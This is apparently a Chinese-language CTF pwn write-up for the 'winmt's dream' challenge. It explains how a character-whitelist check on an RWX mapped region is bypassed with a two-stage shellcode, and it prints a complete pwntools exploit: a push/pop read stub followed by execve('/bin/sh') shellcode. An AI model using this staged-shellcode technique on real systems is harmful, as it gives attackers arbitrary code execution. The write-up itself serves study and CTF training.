# week1winmt's dream

## 题目简述

程序用 `mmap(0x8000, 0x1000, 7, 34, -1, 0)` 创建固定地址的 RWX 区域，读取最多约 `0x20` 字节并在字符白名单检查后跳转执行。直接写入 `execve` shellcode 会被长度和字符限制拦截，因此需要构造受限的第一阶段 `read` shellcode，再读入不受检查的第二阶段。

## 解题过程

配套 libc 版本为 2.35-3.1，对应的运行环境会影响函数入口处的栈布局；第一阶段需要从栈上 `pop` 现成数据，因此本地调试环境应与远程一致。

程序把 `qword_4050` 设为映射区地址 `0x8000`，其中保护值 7 表示可读、可写、可执行。主函数末尾通过 `qword_4050()` 间接调用该区域，所以目标是在这里布置 shellcode。

程序先向映射区读入第一阶段，并以 `\0` 结束。

然后，在主程序中间的部分有一个嵌套循环，每次会调用一个用于 check 的函数 `sub_128B`，传入的参数是两个字符。这个函数其实就是将两个参数中所有小写转成大写，如果第二个参数小于 `0x10` 就加上 `0x50`。

再看看这两个传入的参数，第二个参数是外层循环从 `qword_4050` 中依次取出的一个字符，第一个参数是在外循环中每次内层循环从字符串 `off_4010` 中取出的一个字符。也就是说，需要你读入的 shellcode 中每个字符（小于 `0x10` 的加上 `0x50`）都能在 `off_4010` 字符串，即 `Plz give me a girlfriend, thx u ^_^` 中找到（不分大小写）。

首先可以发现 `syscall` 的 shellcode 中两个机器码加上 `0x50` 都可以在字符串中找到，因此 `syscall` 是可以用的，这就意味着我们可以执行系统调用。

但是直接把 `execve("/bin/sh", 0, 0)` 的经典 shellcode 给写进去肯定是不行的，里面有大量不可见字符，更别说这题只允许这几个可见字符了，而且貌似只给读 `0x20` 大小的 shellcode 也不太够读。因此很容易想到先构造 `read` 系统调用的 shellcode，读入一串 `execve` 的 shellcode 到 `read` 的 shellcode 后面，然后接着执行就可以了，这就避开了检查。

第一阶段需要满足 `read(0, qword_4050, size)` 的寄存器约束，即 `rax=0`、`rdi=0`、`rsi` 指向映射区，且 `rdx` 足够大。直接使用带立即数的 `mov` 容易产生不可见字节或 `\0`；`push`、`pop` 的机器码则较容易落在允许的可见字符范围内。因此可从入口栈上取现成数据设置 `rdi`、`rax` 和 `rdx`。

最后来看 `rsi`，看到如下最后调用 `qword_4050()` 的汇编：

~~~asm
mov     rax, cs:qword_4050
call    rax ; qword_4050
~~~

可以知道此时的 `rax` 中存放着的就是 `qword_4050` 的地址，因此直接 `push rax` 再 `pop rsi` 即可。

综合以上的思路，可以整理出如下的 exp：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# io = process("./pwn")
io = remote("HOST", PORT)

payload = asm("""
    push rax
    pop rsi
    pop rdx
    pop rdi
    pop rax
    pop rax
    pop rax
    pop rax
    syscall
""")

shellcode = asm('''
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall
''')

io.sendafter("Please tell me winmt's dream :\n", payload + b'\x00')
sleep(0.1)
io.send(b'a' * len(payload) + shellcode)
io.interactive()
~~~

## 方法总结

- 核心方法：用满足字符白名单的短 `read` shellcode 作为第一阶段，再覆盖读入完整 `execve` shellcode，实现分阶段执行。
- 识别特征：固定 RWX 映射、执行用户输入、首阶段长度很短且逐字节白名单校验，但后续 `read` 的数据不再检查。
- 注意事项：第一阶段依赖入口寄存器和栈内容，应在匹配环境中动态验证；第二次发送需用填充覆盖第一阶段，使返回自 `syscall` 后恰好继续执行第二阶段。
